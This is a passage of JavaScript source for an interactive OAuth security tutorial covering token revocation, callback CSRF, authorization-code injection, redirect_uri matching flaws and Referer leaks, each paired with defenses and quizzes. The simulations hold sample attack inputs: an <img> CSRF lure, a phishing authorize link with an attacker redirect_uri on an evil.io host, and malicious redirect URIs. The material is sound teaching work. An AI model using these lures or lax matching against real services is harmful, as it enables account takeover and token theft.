              <li>Move <b>User revokes at</b> just after a blue dot (an AS call): the lag is worst when revocation happens right after the cache was refreshed.</li>
              <li>Switch to <b>JWT</b>: zero AS calls. With a 15-minute <code>exp</code>, every call after revocation is red. Drop the lifetime to 5 minutes and watch the red shrink.</li>
            </ul>
            <div class="tip">Real systems combine these: short-lived JWT access tokens (no per-request AS call), revocable refresh tokens, and, for
            high-risk APIs, introspection with a small cache or push-based revocation events.</div>
          </details>
        `,
      },
    ],
    quiz: [
      { q: 'Who calls the introspection endpoint?',
        options: ['The user\'s browser', 'The resource server (API), authenticating itself', 'Anyone, without authentication', 'Only the client that owns the token'],
        answer: 1, why: 'RFC 7662: the protected resource asks the AS about a token. The endpoint requires authorization so it cannot be used to probe tokens.' },
      { q: 'Introspecting an expired or revoked token returns…',
        options: ['404 Not Found', '200 {"active": false}', '401 with the reason', '200 {"active": true, "revoked": true}'],
        answer: 1, why: 'Inactive tokens get just active:false, with no detail about why.' },
      { q: 'A client calls <code>/revoke</code> with a token that is already invalid. The response is…',
        options: ['400 invalid_token', '200 OK', '404', '410 Gone'],
        answer: 1, why: 'RFC 7009 §2.2: invalid tokens do not cause an error, since the goal (token unusable) is already achieved.' },
      { q: 'An API caches introspection results for 5 minutes. What is the downside?',
        options: ['Tokens expire faster', 'A revoked token can keep working for up to 5 minutes', 'Introspection stops working', 'Scopes are ignored'],
        answer: 1, why: 'The cache answers from memory without asking the AS, so revocation only takes effect when the cache entry expires.' },
    ],
    exercise: {
      task: `<p>Alice clicks <em>Disconnect</em> in PrintApp. Write the raw HTTP request PrintApp sends to revoke its <strong>refresh token</strong> (details in the box below),
        then click <strong>Check</strong>.</p>`,
      hint: 'POST /revoke HTTP/1.1, Host, Authorization: Basic base64(client_id:client_secret), Content-Type: application/x-www-form-urlencoded, a blank line, then token=…&token_type_hint=refresh_token',
      starter: W(`<div id="ex"></div>`, exRevoke, '', { fill: false }),
      solution: W(`<div id="ex"></div>`, exRevoke, '', { fill: true }),
    },
  });

  function exRevoke() {
    const ID = 'printapp', SEC = 's3cr3t-printapp', RT = 'mc_rt_tGzv3JOkF0XG5Qx2TlKWIA';
    const B = Auth.b64(ID + ':' + SEC);
    $('#ex').innerHTML = '<div class="card"><table class="t"><tr><td>Revocation endpoint</td><td><code>https://accounts.megacorp.example/revoke</code></td></tr>' +
      '<tr><td>Client auth</td><td>client_secret_basic: <code>' + ID + '</code> / <code>' + SEC + '</code></td></tr>' +
      '<tr><td>Token to revoke</td><td><code>' + RT + '</code> (a refresh token; include the hint)</td></tr></table>' +
      '<div class="row" style="margin-top:6px">🧰 base64 helper: <input id="bi" class="mono" placeholder="text to encode" style="flex:1"> → <code id="bo"></code></div></div>' +
      '<textarea id="r" rows="7" placeholder="POST ... HTTP/1.1"></textarea><button class="primary" id="chk">Check</button><div class="fb" id="fb"></div>';
    $('#bi').oninput = () => ($('#bo').textContent = $('#bi').value ? Auth.b64($('#bi').value) : '');
    if (DATA.fill) $('#r').value = 'POST /revoke HTTP/1.1\nHost: accounts.megacorp.example\nAuthorization: Basic ' + B +
      '\nContent-Type: application/x-www-form-urlencoded\n\ntoken=' + RT + '&token_type_hint=refresh_token';
    $('#chk').onclick = () => {
      const r = parseHttp($('#r').value), e = [];
      if (r.method !== 'POST') e.push('Revocation uses <code>POST</code>.');
      if (r.path !== '/revoke') e.push('Path should be <code>/revoke</code>.');
      if ((r.headers.host || '') !== 'accounts.megacorp.example') e.push('Add <code>Host: accounts.megacorp.example</code>.');
      const a = (r.headers.authorization || '').replace(/^Basic\s+/i, '');
      if (!/^Basic\s+/i.test(r.headers.authorization || '') || a !== B) e.push('Authorization must be <code>Basic</code> + base64("' + ID + ':' + SEC + '"). The client authenticates to revoke its own tokens.');
      if (!/^application\/x-www-form-urlencoded/i.test(r.headers['content-type'] || '')) e.push('Content-Type must be <code>application/x-www-form-urlencoded</code>.');
      const b = new URLSearchParams(r.body);
      if (b.get('token') !== RT) e.push('Body needs <code>token=' + RT + '</code>.');
      if (b.get('token_type_hint') !== 'refresh_token') e.push('Add <code>token_type_hint=refresh_token</code> so the AS looks in the right place first.');
      if (e.length) return feedback($('#fb'), false, '❌ Not yet:<ul><li>' + e.join('</li><li>') + '</li></ul>');
      feedback($('#fb'), true, '✅ Correct. The AS replies <code>HTTP/1.1 200 OK</code> with an empty body, and should also invalidate access tokens from the same grant.');
    };
  }

  // ───────────────────────────── 11. oauth-attacks ─────────────────────────────
  L.push({
    id: 'oauth-attacks',
    section: SECTION,
    title: 'OAuth attacks & defenses',
    explain: `
      <p>Most real OAuth breaches aren't crypto breaks. They come from <strong>small validation gaps</strong> in the redirect dance. Here are the classics, all
      described in <strong>RFC 9700</strong> (OAuth 2.0 Security BCP, 2025), with the one-line fix for each.</p>
      <h3>1. Missing <code>state</code>: CSRF / account-linking attack</h3>
      <p>The attacker completes a flow with <em>their own</em> MegaCorp account, stops before the callback, and tricks the victim's browser into opening
      <code>https://printapp.example/callback?code=ATTACKER_CODE</code>. PrintApp links the <strong>attacker's</strong> MegaCorp account to the <strong>victim's</strong>
      PrintApp account, and the victim's scans get saved into the attacker's storage. <strong>Fix:</strong> a random <code>state</code> bound to the user's session (or PKCE, which RFC 9700 accepts as CSRF protection too).</p>
      <h3>2. Lax <code>redirect_uri</code> matching: code theft</h3>
      <p>If the AS accepts any URI that "starts with" or "is on the same domain as" the registered one, an attacker crafts
      <code>/authorize?client_id=printapp&amp;redirect_uri=https://printapp.example.evil.io/cb</code>. The victim (already logged in and consented) is silently redirected
      to the attacker <em>with a fresh code</em>. PKCE doesn't save you here: the attacker wrote the request, so they chose the challenge.
      <strong>Fix:</strong> exact string matching against pre-registered URIs (the only exception is the port of a native app's <code>http://127.0.0.1</code> loopback redirect).
      Also watch for open redirects on the client.</p>
      <h3>3. Code injection</h3>
      <p>An attacker who stole a victim's code (from logs, Referer, or a malicious app) pastes it into <em>their own</em> callback. <code>state</code> matches (it's the attacker's own session),
      and the confidential client happily redeems it with its secret, so the attacker is now logged in as the victim. <strong>Fix:</strong> PKCE, because the code is bound to the
      verifier in the victim's session.</p>
      <h3>4. Leakage via Referer, logs and history</h3>
      <p>Codes in callback URLs can leak through <code>Referer</code> (if the page loosens the default policy), proxy and server logs, or browser history.
      <strong>Fix:</strong> codes short-lived (≤ 1 min) and <strong>single-use</strong>, <code>Referrer-Policy: no-referrer</code> on the callback, and redirect to a clean URL right after processing.</p>
      <h3>Defense checklist</h3>
      <ul>
        <li>✅ <strong>Exact <code>redirect_uri</code> matching</strong>; no wildcards; HTTPS only (loopback port excepted).</li>
        <li>✅ <strong>PKCE (S256) for every client</strong>, plus <code>state</code> (or OIDC <code>nonce</code>) bound to the session.</li>
        <li>✅ <strong>Codes:</strong> short lifetime, single-use, bound to client_id + redirect_uri; revoke tokens if a code is replayed.</li>
        <li>✅ <strong>No tokens in URLs</strong> (no Implicit), <code>Cache-Control: no-store</code>, <code>Referrer-Policy</code>.</li>
        <li>✅ <strong>Least scope, audience-restricted tokens</strong>, short access-token lifetime, refresh-token rotation for public clients.</li>
        <li>✅ <strong>Multiple ASes?</strong> Check the <code>iss</code> parameter on the callback (RFC 9207) to stop "mix-up" attacks.</li>
        <li>✅ <strong>Sender-constrained tokens</strong> for high-value APIs: <strong>DPoP</strong> (RFC 9449) or mTLS (RFC 8705).</li>
      </ul>
      <div class="tip"><strong>DPoP in one paragraph:</strong> the client generates a key pair and, on every request, sends a <code>DPoP</code> header: a small JWT signed with its
      private key that contains the HTTP method, URL, a timestamp and a unique ID. The AS binds the access token to that public key (<code>cnf.jkt</code>), and the API
      checks the proof. Result: a stolen token is useless without the private key. The header is <code>Authorization: DPoP &lt;token&gt;</code> instead of <code>Bearer</code>.</div>
    `,
    examples: [
      {
        title: 'state CSRF & code injection: with and without defenses',
        code: W(`<div id="flow"></div>`, function () {
          const AC = 'ATK_' + Auth.randB64url(8), VC = 'VIC_' + Auth.randB64url(8);
          const CB = 'https://printapp.example/callback';
          const actors = [
            { id: 'a', label: 'Attacker', icon: '😈', store: { MegaCorp: 'mallory@megacorp' } },
            { id: 'v', label: 'Victim browser', icon: '🧑', store: { PrintApp: 'logged in as victim' } },
            { id: 'p', label: 'PrintApp', icon: '🖨', store: {}, storeLabel: 'PrintApp sessions' },
            { id: 'as', label: 'MegaCorp AS', icon: '🛂', store: {} },
          ];
          const attackerPrep = (withState) => [
            { from: 'a', to: 'p', label: 'start "Connect MegaCorp" (own account)', msg: 'GET /connect/megacorp HTTP/1.1\nHost: printapp.example\nCookie: app_sid=ATTACKER',
              set: withState ? { p: { 'sess ATTACKER.state': 'S_att' } } : {} },
            { from: 'p', to: 'a', kind: 'redirect', label: '302 → /authorize' + (withState ? ' (state=S_att)' : ' (no state!)'),
              msg: 'HTTP/1.1 302 Found\nLocation: https://accounts.megacorp.example/authorize?' + form(Object.assign({ response_type: 'code', client_id: 'printapp', redirect_uri: CB, scope: 'photos.write' }, withState ? { state: 'S_att' } : {})) },
            { from: 'a', to: 'as', label: 'log in as mallory + Allow', msg: 'POST /authorize/decision HTTP/1.1\nHost: accounts.megacorp.example\n\napprove=true' },
            { from: 'as', to: 'a', kind: 'redirect', label: '302 → callback?code=ATK…', msg: 'HTTP/1.1 302 Found\nLocation: ' + CB + '?code=' + AC + (withState ? '&state=S_att' : ''),
              set: { as: { [AC]: 'mallory, unused' } } },
            { from: 'a', to: 'a', label: 'STOP: don\'t follow; copy the URL', note: 'The attacker never lets their own browser finish. The code is unused and valid for a minute.' },
            { from: 'a', to: 'v', kind: 'info', label: 'lure: <img src="…/callback?code=ATK…">', msg: '<!-- on any page the victim visits -->\n<img src="' + CB + '?code=' + AC + (withState ? '&state=S_att' : '') + '" width="1" height="1">',
              note: 'A cross-site request in the victim\'s browser, carrying the victim\'s PrintApp cookie. Classic CSRF.' },
            { from: 'v', to: 'p', label: 'GET /callback?code=ATK…  (victim cookie)', msg: 'GET /callback?code=' + AC + (withState ? '&state=S_att' : '') + ' HTTP/1.1\nHost: printapp.example\nCookie: app_sid=VICTIM' },
          ];
          const noState = attackerPrep(false).concat([
            { from: 'p', to: 'as', kind: 'back', label: 'POST /token code=ATK…', msg: 'POST /token HTTP/1.1\nHost: accounts.megacorp.example\nAuthorization: Basic …\n\n' + form({ grant_type: 'authorization_code', code: AC, redirect_uri: CB }),
              note: 'PrintApp has no <code>state</code> to compare, so it just redeems the code.' },
            { from: 'as', to: 'p', kind: 'back', label: '200 token for MALLORY\'s account', msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"access_token":"mc_at_mallory…","token_type":"Bearer","scope":"photos.write"}',
              set: { p: { 'VICTIM linked to': "MegaCorp: mallory 😱" }, as: { [AC]: 'used' } } },
            { from: 'v', to: 'p', label: 'victim: "save my scans to MegaCorp"', msg: 'POST /scans/upload HTTP/1.1\nHost: printapp.example\nCookie: app_sid=VICTIM\n\n<passport-scan.pdf>' },
            { from: 'p', to: 'as', kind: 'err', label: 'upload → into mallory\'s storage', msg: 'POST /v1/photos HTTP/1.1\nHost: api.megacorp.example\nAuthorization: Bearer mc_at_mallory…\n\n<passport-scan.pdf>',
              note: '<b>Attack succeeds:</b> the victim\'s private documents land in the attacker\'s account.' },
          ]);
          const withState = [
            { from: 'v', to: 'p', label: '(earlier) victim session has no flow', set: { p: { 'sess VICTIM.state': '(none)' } }, note: 'The victim never started a Connect flow, so their session has no pending <code>state</code>. (If they had, it would be their own random value, not S_att.)' },
          ].concat(attackerPrep(true), [
            { from: 'p', to: 'p', label: 'state S_att ≠ session VICTIM state', note: 'The callback\'s <code>state=S_att</code> belongs to the <b>attacker\'s</b> session, not the victim\'s. PrintApp rejects it <b>before</b> touching the code.' },
            { from: 'p', to: 'v', kind: 'err', label: '400 invalid state', msg: 'HTTP/1.1 400 Bad Request\nContent-Type: text/html\n\n<p>This sign-in link is invalid or expired. Please try again.</p>', note: '<b>Attack blocked.</b> The code was never redeemed.' },
          ]);
          const injection = [
            { from: 'v', to: 'p', label: '(victim\'s code leaked earlier)', set: { a: { 'stolen code': VC + ' (victim)' }, as: { [VC]: 'victim, unused, no PKCE' } },
              note: 'The attacker obtained a victim\'s fresh code, e.g. from a leaked log line or a Referer header.' },
            { from: 'a', to: 'p', label: 'start own flow (gets state=S_att)', msg: 'GET /login/megacorp HTTP/1.1\nHost: printapp.example\nCookie: app_sid=ATTACKER', set: { p: { 'sess ATTACKER.state': 'S_att' } } },
            { from: 'p', to: 'a', kind: 'redirect', label: '302 → /authorize (state=S_att)', msg: 'HTTP/1.1 302 Found\nLocation: https://accounts.megacorp.example/authorize?response_type=code&client_id=printapp&state=S_att&...' },
            { from: 'a', to: 'p', label: 'GET /callback?code=VIC…&state=S_att', msg: 'GET /callback?code=' + VC + '&state=S_att HTTP/1.1\nHost: printapp.example\nCookie: app_sid=ATTACKER', hl: ['code=' + VC],
              note: 'The attacker swaps in the <b>victim\'s</b> code but keeps <b>their own</b> state.' },
            { from: 'p', to: 'p', label: 'state matches ✓ (attacker\'s own!)', note: '<code>state</code> only proves "this callback belongs to this browser\'s flow". It does, it\'s the attacker\'s own browser. state can\'t detect a swapped code.' },
            { from: 'p', to: 'as', kind: 'back', label: 'POST /token code=VIC… + client secret', msg: 'POST /token HTTP/1.1\nHost: accounts.megacorp.example\nAuthorization: Basic cHJpbnRhcHA6…\n\n' + form({ grant_type: 'authorization_code', code: VC, redirect_uri: CB }),
              note: 'The <b>real client</b> redeems it with its real secret, so the client secret doesn\'t help either.' },
            { from: 'as', to: 'p', kind: 'back', label: '200 token for VICTIM', msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"access_token":"mc_at_victim…","token_type":"Bearer"}',
              set: { p: { 'sess ATTACKER': 'acting as VICTIM 😱' } }, note: '<b>Attack succeeds:</b> the attacker\'s session now holds the victim\'s access.' },
          ];
          const vChal = Auth.sha256b64url('victim-verifier-' + VC), aVer = Auth.randB64url(32);
          const injectionPkce = [
            { from: 'v', to: 'p', label: '(victim\'s code leaked earlier)', set: { a: { 'stolen code': VC + ' (victim)' }, as: { [VC]: 'victim, challenge=' + vChal.slice(0, 8) + '…' } },
              note: 'This time the victim\'s code is bound to the victim session\'s PKCE challenge.' },
            { from: 'a', to: 'p', label: 'start own flow', msg: 'GET /login/megacorp HTTP/1.1\nHost: printapp.example\nCookie: app_sid=ATTACKER', set: { p: { 'sess ATTACKER': 'state=S_att, verifier=' + aVer.slice(0, 8) + '…' } } },
            { from: 'a', to: 'p', label: 'GET /callback?code=VIC…&state=S_att', msg: 'GET /callback?code=' + VC + '&state=S_att HTTP/1.1\nHost: printapp.example\nCookie: app_sid=ATTACKER' },
            { from: 'p', to: 'as', kind: 'back', label: 'POST /token code=VIC… + ATTACKER\'s verifier', msg: 'POST /token HTTP/1.1\nHost: accounts.megacorp.example\nAuthorization: Basic cHJpbnRhcHA6…\n\n' + form({ grant_type: 'authorization_code', code: VC, redirect_uri: CB, code_verifier: aVer }),
              hl: ['code_verifier='], note: 'PrintApp sends the verifier from the <b>current session</b>, which is the attacker\'s.' },
            { from: 'as', to: 'as', label: 'SHA256(attacker verifier) ≠ victim challenge', note: 'BASE64URL(SHA256(' + aVer.slice(0, 10) + '…)) = <code>' + Auth.sha256b64url(aVer).slice(0, 16) + '…</code> ≠ <code>' + vChal.slice(0, 16) + '…</code>' },
            { from: 'as', to: 'p', kind: 'err', label: '400 invalid_grant 🛡', msg: 'HTTP/1.1 400 Bad Request\nContent-Type: application/json\n\n{"error":"invalid_grant"}', hl: ['invalid_grant'], note: '<b>Injection blocked.</b> A code only works in the session that created its PKCE pair.' },
          ];
          Seq.mount('#flow', { title: 'CSRF on the callback & authorization code injection', actors,
            scenarios: [{ name: '❌ No state: account linking', steps: noState }, { name: '✅ state blocks it', steps: withState },
              { name: '❌ Code injection (no PKCE)', steps: injection }, { name: '🛡 PKCE blocks injection', steps: injectionPkce }] });
        }),
        explain: `
          <details>
            <summary>The problem: the callback URL is just a link anyone can make you open</summary>
            <p><code>/callback?code=…</code> is a normal GET. Any web page can make the victim's browser request it (an <code>&lt;img&gt;</code>, a link, a redirect), and the browser attaches the victim's
            cookies. Without a check that ties the callback to the flow <em>this browser</em> started, the client can't tell an injected callback from a real one.</p>
          </details>
          <details>
            <summary>Step by step: compare the four tabs</summary>
            <table>
              <tr><th>Tab</th><th>Attacker's trick</th><th>Decisive step</th><th>Outcome</th></tr>
              <tr><td>❌ No state</td><td>Victim's browser opens attacker's callback (step 6–7)</td><td>8–9: PrintApp redeems, links mallory's account to the victim</td><td>Victim uploads into attacker's storage</td></tr>
              <tr><td>✅ state</td><td>Same, but the URL carries the attacker's <code>state=S_att</code></td><td>9: <code>S_att</code> ≠ victim session's state</td><td>400, code never redeemed</td></tr>
              <tr><td>❌ Injection</td><td>Attacker pastes a stolen <em>victim</em> code into their <em>own</em> callback</td><td>5: state matches (attacker's own); 6–7: real client secret is used</td><td>Attacker acts as victim</td></tr>
              <tr><td>🛡 PKCE</td><td>Same injection</td><td>4–5: attacker session's verifier doesn't hash to the victim's challenge</td><td>400 invalid_grant</td></tr>
            </table>
          </details>
          <details>
            <summary>Key ideas</summary>
            <ul>
              <li><strong>state</strong> answers "did <em>this browser</em> start this flow?" It stops CSRF (tab 2) but not a swapped code in the attacker's own browser (tab 3).</li>
              <li><strong>PKCE</strong> answers "was <em>this code</em> issued to the flow that holds this verifier?" It stops injection (tab 4) and also works as CSRF protection.</li>
              <li><strong>Client secrets don't stop either attack</strong>: in both, the real client does the redemption.</li>
            </ul>
          </details>
          <details>
            <summary>Try this</summary>
            <ul>
              <li>In tab 1, watch the PrintApp card at step 9: <code>VICTIM linked to: MegaCorp: mallory</code>.</li>
              <li>In tab 2, compare the two session values in the PrintApp card with the <code>state</code> in step 8's URL.</li>
              <li>In tab 3, step 5 is the surprising one: the state check passes.</li>
            </ul>
          </details>
        `,
      },
      {
        title: 'redirect_uri attacks: lax matching & Referer leak',
        code: W(`<div id="flow"></div>`, function () {
          const REG = 'https://printapp.example/callback', EVIL = 'https://printapp.example.evil.io/callback';
          const code = Auth.randB64url(12), ch = Auth.sha256b64url('attacker-chosen'), cbq = form({ code, state: 'abc' });
          const actors = [
            { id: 'a', label: 'Attacker', icon: '😈', store: {} },
            { id: 'v', label: 'Victim browser', icon: '🧑', store: { MegaCorp: 'logged in, consented before' } },
            { id: 'as', label: 'MegaCorp AS', icon: '🛂', store: { 'printapp-spa registered': REG } },
            { id: 'x', label: 'printapp / 3rd party', icon: '🌍', store: {} },
          ];
          const link = 'https://accounts.megacorp.example/authorize?' + form({ response_type: 'code', client_id: 'printapp-spa', redirect_uri: EVIL, scope: 'photos.read', state: 'abc', code_challenge: ch, code_challenge_method: 'S256' });
          const lure = { from: 'a', to: 'v', kind: 'info', label: 'phishing link to the REAL MegaCorp', msg: '<a href="' + link + '">See who viewed your photos!</a>', hl: ['redirect_uri=' + encodeURIComponent(EVIL)],
            note: 'The link points to the <b>real</b> MegaCorp domain with the <b>real</b> client_id. Only <code>redirect_uri</code> is evil, and the attacker even picked their own PKCE challenge.' };
          const click = { from: 'v', to: 'as', label: 'GET /authorize?…redirect_uri=evil', msg: 'GET /authorize?' + link.split('?')[1] + ' HTTP/1.1\nHost: accounts.megacorp.example\nCookie: mc_sid=VICTIM' };
          const lax = [lure, click,
            { from: 'as', to: 'as', label: 'startsWith("https://printapp.example") ✓ 🙈', note: 'Prefix / "same-ish domain" matching: <code>' + EVIL + '</code> starts with <code>https://printapp.example</code>. Accepted.' },
            { from: 'as', to: 'v', kind: 'redirect', label: '302 → evil.io?code=… (no prompt!)', msg: 'HTTP/1.1 302 Found\nLocation: ' + EVIL + '?' + cbq, hl: ['code=' + code],
              note: 'The victim already consented to printapp-spa earlier, so there\'s no screen at all. The redirect is instant.' },
            { from: 'v', to: 'a', kind: 'err', label: 'GET evil.io/callback?code=…', msg: 'GET /callback?' + cbq + ' HTTP/1.1\nHost: printapp.example.evil.io', set: { a: { code: code.slice(0, 8) + '… (victim)' } } },
            { from: 'a', to: 'as', kind: 'back', label: 'POST /token + attacker\'s own verifier', msg: 'POST /token HTTP/1.1\nHost: accounts.megacorp.example\nContent-Type: application/x-www-form-urlencoded\n\n' + form({ grant_type: 'authorization_code', code, client_id: 'printapp-spa', redirect_uri: EVIL, code_verifier: 'attacker-chosen' }),
              note: 'Public client: no secret. The attacker knows the verifier because <b>they</b> built the authorization request. PKCE can\'t help when the attacker controls the request.' },
            { from: 'as', to: 'a', kind: 'res', label: '200 victim\'s tokens 😱', msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"access_token":"mc_at_victim…","token_type":"Bearer","refresh_token":"mc_rt_victim…"}', set: { a: { tokens: 'victim 😱' } } },
          ];
          const exact = [lure, click,
            { from: 'as', to: 'as', label: 'exact string compare ✗', note: '<code>' + EVIL + '</code> !== <code>' + REG + '</code>. RFC 9700: exact string matching.' },
            { from: 'as', to: 'v', kind: 'err', label: '400 error page (NO redirect)', msg: 'HTTP/1.1 400 Bad Request\nContent-Type: text/html\n\n<h1>Invalid redirect_uri</h1>\n<p>The redirect URI is not registered for this application.</p>',
              note: 'RFC 6749 §4.1.2.1: if the redirect_uri is invalid, the AS must <b>not</b> redirect, not even with an error, because that would make it an open redirector. <b>Attack blocked.</b>' },
          ];
          const referer = [
            { from: 'v', to: 'x', label: 'GET /callback?code=…&state=…', msg: 'GET /callback?' + cbq + ' HTTP/1.1\nHost: printapp.example', note: 'Legit callback to PrintApp.' },
            { from: 'x', to: 'v', kind: 'res', label: '200 HTML with 3rd-party <img>', msg: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<meta name="referrer" content="unsafe-url">   <!-- someone loosened the policy -->\n<img src="https://ads.example/pixel.gif">', hl: ['unsafe-url'],
              note: 'The callback page renders HTML (with the code still in the URL) and loads a third-party resource.' },
            { from: 'v', to: 'a', kind: 'err', label: 'GET pixel.gif  Referer: …?code=…', msg: 'GET /pixel.gif HTTP/1.1\nHost: ads.example\nReferer: https://printapp.example/callback?' + cbq, hl: ['Referer'], set: { a: { 'from ad logs': 'code=' + code.slice(0, 8) + '…' } },
              note: 'The full URL, code included, lands in a third party\'s logs. (Modern browsers default to <code>strict-origin-when-cross-origin</code>, which would send only the origin. Leaks happen when a page or old browser weakens that.)' },
            { from: 'x', to: 'x', label: 'defenses', note: '✅ <code>Referrer-Policy: no-referrer</code> on the callback · ✅ redeem the code first, then <code>302</code> to a clean URL like <code>/photos</code> · ✅ single-use, ~60 s codes · ✅ PKCE, so a leaked code alone is useless.' },
          ];
          Seq.mount('#flow', { title: 'redirect_uri validation & leakage', actors,
            scenarios: [{ name: '❌ Prefix matching', steps: lax }, { name: '✅ Exact matching', steps: exact }, { name: '💧 Referer leak', steps: referer }] });
        }),
        explain: `
          <details>
            <summary>Step by step: ❌ prefix vs ✅ exact</summary>
            <table>
              <tr><th>Step</th><th>❌ Prefix matching</th><th>✅ Exact matching</th></tr>
              <tr><td>1–2</td><td colspan="2">Victim clicks a link to the <b>real</b> AS with <code>redirect_uri=https://printapp.example.evil.io/callback</code></td></tr>
              <tr><td>3</td><td><code>startsWith</code> → accepted</td><td>string ≠ registered → rejected</td></tr>
              <tr><td>4</td><td>302 to evil.io with a fresh code (no consent prompt: already granted)</td><td>400 error page, <b>no redirect</b></td></tr>
              <tr><td>5–7</td><td>attacker redeems with their own PKCE verifier → victim's tokens</td><td>-</td></tr>
            </table>
          </details>
          <details>
            <summary>Key ideas</summary>
            <ul>
              <li>The redirect_uri is <strong>where the AS sends secrets</strong>. Treat it like a password comparison: exact, no patterns.</li>
              <li>PKCE protects against <em>someone else</em> intercepting your code. It can't help if the attacker started the request themselves.</li>
              <li>Invalid redirect_uri → show an error at the AS, never redirect.</li>
              <li>Leaks via Referer and logs are why codes must be single-use and short-lived, and why you clean the URL right after the callback.</li>
            </ul>
          </details>
          <details>
            <summary>Try this</summary>
            <ul>
              <li>In ❌ Prefix, click step 1 and find the highlighted <code>redirect_uri</code>. Everything else in the link is legitimate.</li>
              <li>Step 6 shows the attacker sending <code>code_verifier=attacker-chosen</code>: PKCE passes because they chose it.</li>
              <li>Then try the matcher in the next example with your own URIs.</li>
            </ul>
          </details>
        `,
      },
      {
        title: 'redirect_uri matcher: which policy lets attacks through?',
        code: W(`
<div class="card">
  <div class="row"><label>Registered: <input id="reg" class="mono" style="width:300px" value="https://printapp.example/callback"></label>
    <label>AS matching policy: <select id="pol">
      <option value="exact">Exact string (RFC 9700)</option>
      <option value="prefix">Prefix (startsWith)</option>
      <option value="host">Same host, any path</option>
      <option value="wild">Wildcard https://*.printapp.example/*</option>
    </select></label></div>
  <div class="row" style="margin-top:6px"><input id="mine" class="mono" style="flex:1" placeholder="try your own redirect_uri…"><button id="add">Test</button></div>
</div>
<table class="t" id="tbl"></table>
<div class="fb" id="sum"></div>
`, function () {
          const CANDS = [
            ['https://printapp.example/callback', false, 'the real one'],
            ['https://printapp.example.evil.io/callback', true, 'attacker-owned domain that starts with the right text'],
            ['https://printapp.example/callback/../logout?next=https://evil.io', true, 'path traversal into an open redirect'],
            ['https://printapp.example/redirect?to=https://evil.io', true, 'open redirect elsewhere on the same host'],
            ['https://evil.printapp.example/callback', true, 'forgotten or taken-over subdomain'],
            ['https://printapp.example/callback?x=1', true, 'extra query (not registered)'],
            ['http://printapp.example/callback', true, 'plain HTTP downgrade'],
          ];
          const custom = [];
          function match(pol, reg, u) {
            let R, U;
            try { R = new URL(reg); U = new URL(u); } catch (e) { return false; }
            if (pol === 'exact') return u === reg;
            if (pol === 'prefix') return u.startsWith(reg.replace(/\/callback$/, '')) || u.startsWith(reg);
            if (pol === 'host') return U.host === R.host;
            if (pol === 'wild') return U.protocol === 'https:' && (U.hostname === R.hostname || U.hostname.endsWith('.' + R.hostname));
            return false;
          }
          function render() {
            const pol = $('#pol').value, reg = $('#reg').value.trim();
            const rows = CANDS.concat(custom);
            let leaks = 0;
            $('#tbl').innerHTML = '<tr><th>Incoming redirect_uri</th><th>What it is</th><th>AS decision</th></tr>' + rows.map((c) => {
              const ok = match(pol, reg, c[0]);
              const attack = c[1] === null ? null : c[0] === reg ? false : c[1];
              if (ok && attack) leaks++;
              const verdict = ok ? (attack ? '<span class="pill r">accepted: code goes to attacker</span>' : '<span class="pill g">accepted</span>')
                : (attack === false ? '<span class="pill y">rejected (breaks the real app!)</span>' : '<span class="pill b">rejected</span>');
              return '<tr><td class="mono">' + esc(c[0]) + '</td><td>' + esc(c[2]) + '</td><td>' + verdict + '</td></tr>';
            }).join('');
            feedback($('#sum'), leaks === 0, leaks === 0 ? '✅ No attack URI gets through with this policy.' : '❌ ' + leaks + ' attack URI(s) accepted with this policy.');
          }
          $('#pol').onchange = render; $('#reg').oninput = render;
          $('#add').onclick = () => { const v = $('#mine').value.trim(); if (v) { custom.push([v, null, 'your test']); $('#mine').value = ''; render(); } };
          render();
        }),
        explain: `
          <details>
            <summary>Try this</summary>
            <ul>
              <li>Switch through the four policies. Only <b>Exact string</b> gets zero red rows. "Same host" lets in both open-redirect paths, and the wildcard lets in a subdomain takeover.</li>
              <li>Under <b>Prefix</b>, note that both <code>printapp.example.evil.io</code> and the <code>/../</code> path pass. String prefixes don't understand URL structure.</li>
              <li>Type your own URI and click <b>Test</b> (e.g. <code>https://printapp.example/callback#x</code> or <code>https://PRINTAPP.example/callback</code>) and see how each policy treats it.</li>
            </ul>
          </details>
        `,
      },
    ],
    quiz: [
      { q: 'The client never sends or checks <code>state</code> (and no PKCE). Which attack becomes possible?',
        options: ['Token replay at another API', 'CSRF on the callback: the victim\'s account gets linked to the attacker\'s', 'Signature forgery', 'Brute-forcing the client secret'],
        answer: 1, why: 'Without a per-session value, the client cannot tell that a callback was injected by an attacker.' },
      { q: 'An attacker pastes a stolen victim code into their <em>own</em> callback. What stops it?',
        options: ['state', 'The client secret', 'PKCE (the verifier in the attacker\'s session doesn\'t match the victim\'s challenge)', 'HTTPS'],
        answer: 2, why: 'state matches (it is the attacker\'s own flow) and the real client uses its real secret. Only PKCE binds the code to the original session.' },
      { q: 'How should an AS compare the incoming <code>redirect_uri</code> to the registered one?',
        options: ['Same domain is enough', 'Prefix match', 'Exact string match (port flexibility only for native loopback)', 'Regex with wildcards'],
        answer: 2, why: 'RFC 9700 requires exact string matching; every looser rule has been exploited.' },
      { q: 'The incoming <code>redirect_uri</code> is invalid. What should the AS do?',
        options: ['Redirect to it with error=invalid_request', 'Show an error page itself and not redirect', 'Redirect to the registered URI', 'Issue the code anyway'],
        answer: 1, why: 'Redirecting to an unverified URI, even with an error, turns the AS into an open redirector.' },
      { q: 'What does DPoP (RFC 9449) add?',
        options: ['Longer tokens', 'Binds tokens to a client-held key; each request carries a signed proof, so stolen tokens are useless alone', 'Encrypts the redirect URL', 'Replaces PKCE'],
        answer: 1, why: 'DPoP makes tokens sender-constrained: the API checks a per-request proof JWT signed with the key the token is bound to.' },
    ],
    exercise: {
      task: `<p>You're building the AS's redirect_uri validator. For each incoming value in the box below, decide <strong>Accept</strong> or
        <strong>Reject</strong>, then click <strong>Check</strong>.</p>`,
      hint: 'Exact string comparison against the registered list. The only allowed variation is the port number on a native app\'s http://127.0.0.1 loopback redirect (RFC 8252 §7.3).',
      starter: W(`<div id="ex"></div>`, exRedirect, '', { fill: false }),
      solution: W(`<div id="ex"></div>`, exRedirect, '', { fill: true }),
    },
  });

  function exRedirect() {
    const Q = [
      ['printapp-web', 'https://printapp.example/callback', 'A', 'Exact match.'],
      ['printapp-web', 'https://printapp.example/callback/', 'R', 'Trailing slash makes it a different string.'],
      ['printapp-web', 'https://printapp.example/callback?next=%2Fhome', 'R', 'Extra query: not the registered string.'],
